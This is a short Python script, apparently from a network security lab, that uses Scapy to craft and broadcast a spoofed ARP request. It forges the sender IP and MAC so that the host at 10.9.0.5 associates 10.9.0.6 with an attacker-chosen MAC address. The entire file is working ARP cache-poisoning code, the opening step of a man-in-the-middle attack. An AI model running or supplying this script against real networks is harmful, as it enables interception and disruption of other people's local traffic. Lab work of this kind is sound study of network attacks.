#!/usr/bin/python3

from scapy.all import *

IP_TARGET = '10.9.0.5'
MAC_TARGET = '02:42:0a:09:00:05'

IP_SPOOFED = '10.9.0.6'
MAC_SPOOFED = '02:42:0a:09:00:69'

print("SENDING SPOOFED ARP REQUEST")
#construct the ether header
ether = Ether()
#ether.dst = MAC_SPOOFED
ether.dst = 'ff:ff:ff:ff:ff:ff'
ether.src = MAC_SPOOFED

arp = ARP()
arp.psrc = IP_SPOOFED
arp.hwsrc = MAC_SPOOFED
arp.pdst = IP_TARGET
arp.op = 1
frame = ether/arp
frame.show()
sendp(frame)

